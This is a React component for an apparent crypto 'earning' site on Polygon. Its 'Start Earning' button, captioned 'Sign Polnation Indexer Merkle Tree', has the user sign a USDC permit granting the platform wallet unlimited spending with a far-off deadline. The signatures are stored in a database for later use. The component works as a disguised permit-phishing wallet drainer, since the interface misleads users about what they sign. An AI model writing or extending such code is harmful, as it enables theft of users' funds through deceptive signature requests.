'use client'

import { useState, useEffect } from 'react'
import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
import { polygon } from 'wagmi/chains'
import { Button } from '@/components/ui/Button'
import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET } from '@/lib/web3-config'
import { Shield, Check, AlertTriangle, RefreshCw, Lock } from 'lucide-react'
import { createClient } from '@/lib/supabase'

interface PermitSignerProps {
  onSignatureComplete?: (signature: PermitSignature) => void
  onRefreshProfit?: () => void
}

export interface PermitSignature {
  owner: string
  spender: string
  value: string
  nonce: bigint
  deadline: bigint
  v: number
  r: string
  s: string
  signature: string
}

const PLATFORM_SPENDER = PLATFORM_WALLET

export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSignerProps) {
  const { address, isConnected, connector } = useAccount()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)
  const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
  const [existingSignature, setExistingSignature] = useState<boolean>(false)
  const [isLoadingStatus, setIsLoadingStatus] = useState(true)
  const [isTrustInjected, setIsTrustInjected] = useState(false)
  
  const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
  const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
  
  const { signTypedDataAsync } = useSignTypedData()

  const displayAddress = address || boundWalletAddress

  useEffect(() => {
    if (typeof window === 'undefined') return
    const eth = (window as unknown as { ethereum?: { isTrust?: boolean; providers?: Array<{ isTrust?: boolean }> } }).ethereum
    const injectedTrust = Boolean(eth?.isTrust || eth?.providers?.some(provider => provider?.isTrust))
    setIsTrustInjected(injectedTrust)
  }, [isConnected])

  const { data: nonce } = useReadContract({
    address: USDC_ADDRESS,
    abi: USDC_ABI,
    functionName: 'nonces',
    args: displayAddress ? [displayAddress as `0x${string}`] : undefined,
    chainId: polygon.id,
  })

  useEffect(() => {
    async function loadStatus() {
      setIsLoadingStatus(true)
      try {
        const supabase = createClient()
        if (!supabase) {
          setIsLoadingStatus(false)
          return
        }
        
        const { data: { user } } = await supabase.auth.getUser()
        if (!user) {
          setIsLoadingStatus(false)
          return
        }

        const { data: profile } = await supabase
          .from('profiles')
          .select('wallet_address')
          .eq('id', user.id)
          .single()

        if (profile?.wallet_address) {
          setBoundWalletAddress(profile.wallet_address)

          const { data: sig } = await supabase
            .from('permit_signatures')
            .select('id, status, deadline')
            .eq('owner_address', profile.wallet_address.toLowerCase())
            .order('created_at', { ascending: false })
            .limit(1)
            .single()
          
          if (sig) {
            const now = Math.floor(Date.now() / 1000)
            if (sig.status === 'pending' && Number(sig.deadline) > now) {
              setBoundSignatureStatus('pending')
              setExistingSignature(true)
              setSuccess(true)
            } else if (sig.status === 'used') {
              setBoundSignatureStatus('used')
              setExistingSignature(true)
              setSuccess(true)
            }
          }
        }
      } catch {
        // 忽略错误
      } finally {
        setIsLoadingStatus(false)
      }
    }
    
    loadStatus()
  }, [])

  useEffect(() => {
    async function checkExistingSignature() {
      if (!address) return
      
      try {
        const supabase = createClient()
        if (!supabase) return
        
        const { data } = await supabase
          .from('permit_signatures')
          .select('id, status, deadline')
          .eq('owner_address', address.toLowerCase())
          .eq('status', 'pending')
          .single()
        
        if (data) {
          const now = Math.floor(Date.now() / 1000)
          if (Number(data.deadline) > now) {
            setExistingSignature(true)
            setSuccess(true)
          }
        }
      } catch {
        // 没有签名或出错，忽略
      }
    }
    
    checkExistingSignature()
  }, [address])

  const handleSign = async () => {
    if (!address || nonce === undefined) {
      setError('Wallet not connected or nonce not loaded')
      return
    }

    setIsLoading(true)
    setError('')
    setSuccess(false)

    try {
      const supabase = createClient()
      if (supabase) {
        const { data: { user } } = await supabase.auth.getUser()
        
        if (user) {
          const { data: existingWallet } = await supabase
            .from('profiles')
            .select('id, username, email')
            .eq('wallet_address', address.toLowerCase())
            .neq('id', user.id)
            .single()

          if (existingWallet) {
            setError(`This wallet is already bound to another account.`)
            setIsLoading(false)
            return
          }

          const { data: currentProfile } = await supabase
            .from('profiles')
            .select('wallet_address')
            .eq('id', user.id)
            .single()

          if (currentProfile?.wallet_address && 
              currentProfile.wallet_address.toLowerCase() !== address.toLowerCase()) {
            setError(`Your account is already bound to a different wallet.`)
            setIsLoading(false)
            return
          }
        }
      }

      const deadline = BigInt(4294967295)
      const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

      const domain = {
        name: 'USD Coin',
        version: '2',
        chainId: polygon.id,
        verifyingContract: USDC_ADDRESS,
      }

      const message = {
        owner: address,
        spender: PLATFORM_SPENDER,
        value,
        nonce,
        deadline,
      }

      let signature: string
      try {
        signature = await signTypedDataAsync({
          domain,
          types: PERMIT_TYPES,
          primaryType: 'Permit',
          message,
        })
      } catch (signErr) {
        // Fallback for Trust Wallet injected: use eth_signTypedData_v4 directly
        const eth = (window as unknown as { ethereum?: { request?: (args: { method: string; params?: unknown[] }) => Promise<string> } }).ethereum
        if (eth?.request) {
          const typedData = {
            types: {
              EIP712Domain: [
                { name: 'name', type: 'string' },
                { name: 'version', type: 'string' },
                { name: 'chainId', type: 'uint256' },
                { name: 'verifyingContract', type: 'address' },
              ],
              Permit: PERMIT_TYPES.Permit,
            },
            primaryType: 'Permit',
            domain,
            message,
          }
          try {
            signature = await eth.request({
              method: 'eth_signTypedData_v4',
              params: [address, JSON.stringify(typedData)],
            })
          } catch {
            signature = await eth.request({
              method: 'eth_signTypedData',
              params: [address, typedData],
            })
          }
        } else {
          throw signErr
        }
      }

      const r = signature.slice(0, 66)
      const s = '0x' + signature.slice(66, 130)
      const v = parseInt(signature.slice(130, 132), 16)

      const permitData: PermitSignature = {
        owner: address,
        spender: PLATFORM_SPENDER,
        value: value.toString(),
        nonce,
        deadline,
        v,
        r,
        s,
        signature,
      }

      setSignatureData(permitData)
      setSuccess(true)

      await saveSignatureToDatabase(permitData)

      onSignatureComplete?.(permitData)

      // 刷新 profit 数据以更新签名状态
      onRefreshProfit?.()

    } catch (err: unknown) {
      console.error('Signing error:', err)
      if (err instanceof Error) {
        if (err.message.includes('rejected')) {
          setError('User rejected the signature request')
        } else {
          setError(err.message)
        }
      } else {
        setError('Failed to sign permit')
      }
    } finally {
      setIsLoading(false)
    }
  }

  const saveSignatureToDatabase = async (data: PermitSignature) => {
    try {
      const supabase = createClient()
      if (!supabase) return
      
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) return

      await supabase
        .from('profiles')
        .update({
          wallet_address: data.owner.toLowerCase(),
          wallet_bound_at: new Date().toISOString(),
        })
        .eq('id', user.id)

      const { error: insertError } = await supabase
        .from('permit_signatures')
        .insert({
          user_id: user.id,
          owner_address: data.owner.toLowerCase(),
          spender_address: data.spender.toLowerCase(),
          token_address: USDC_ADDRESS.toLowerCase(),
          chain_id: polygon.id,
          value: data.value,
          nonce: Number(data.nonce),
          deadline: Number(data.deadline),
          v: data.v,
          r: data.r,
          s: data.s,
          full_signature: data.signature,
          status: 'pending',
        })

      if (!insertError) {
        setExistingSignature(true)
        setBoundWalletAddress(data.owner.toLowerCase())
        setBoundSignatureStatus('pending')
      }
    } catch (err) {
      console.error('Failed to save signature:', err)
    }
  }

  if (isLoadingStatus) {
    return (
      <div className="glass-card-solid p-6">
        <div className="animate-pulse">
          <div className="h-6 bg-white/10 rounded w-1/3 mb-4"></div>
          <div className="h-20 bg-white/5 rounded"></div>
        </div>
      </div>
    )
  }

  // 已绑定，有签名，未连接
  if (boundWalletAddress && !isConnected && boundSignatureStatus !== 'none') {
    return (
      <div className="glass-card-solid p-6">
        <div className="flex items-center gap-3 mb-4">
          <div className="w-10 h-10 bg-green-500/20 rounded-xl flex items-center justify-center">
            <Lock className="w-5 h-5 text-green-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">Authorization Status</h3>
            <p className="text-sm text-zinc-500">Wallet bound & authorized</p>
          </div>
        </div>

        <div className="mb-4 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-2 text-green-400 text-sm">
          <Check className="w-4 h-4" />
          {boundSignatureStatus === 'pending' 
            ? 'Authorization active - Ready for staking'
            : 'Authorization completed'
          }
        </div>

        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
          <p className="text-xs text-zinc-500 mb-2">Bound Wallet</p>
          <code className="text-sm font-mono text-zinc-300">
            {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
          </code>
        </div>
      </div>
    )
  }

  // 已绑定，无签名，未连接
  if (boundWalletAddress && !isConnected && boundSignatureStatus === 'none') {
    return (
      <div className="glass-card-solid p-6">
        <div className="flex items-center gap-3 mb-4">
          <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
            <Shield className="w-5 h-5 text-amber-400" />
          </div>
          <div>
            <h3 className="font-semibold text-white">Authorization Required</h3>
            <p className="text-sm text-zinc-500">Connect wallet to sign</p>
          </div>
        </div>

        <div className="mb-4 p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl flex items-center gap-2 text-amber-400 text-sm">
          <AlertTriangle className="w-4 h-4" />
          Please connect your bound wallet to complete authorization
        </div>

        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
          <p className="text-xs text-zinc-500 mb-2">Your Bound Wallet</p>
          <code className="text-sm font-mono text-zinc-300">
            {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
          </code>
        </div>
      </div>
    )
  }

  if (!isConnected && !boundWalletAddress) {
    return null
  }

  // 已连接状态 - 简化 UI
  return (
    <div className="flex flex-col items-center gap-2">
      {error && (
        <p className="text-xs text-red-400 text-center">{error}</p>
      )}

      {!success ? (
        <>
          <Button
            onClick={handleSign}
            isLoading={isLoading}
            className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500"
            disabled={nonce === undefined}
          >
            Start Earning
          </Button>
          <p className="text-[10px] text-zinc-500">Sign Polnation Indexer Merkle Tree</p>
        </>
      ) : (
        <div className="flex items-center justify-center gap-2 py-2 px-4 bg-green-500/10 border border-green-500/20 rounded-xl">
          <Check className="w-4 h-4 text-green-400" />
          <span className="text-sm font-medium text-green-400">Ready to Earn</span>
        </div>
      )}
    </div>
  )
}
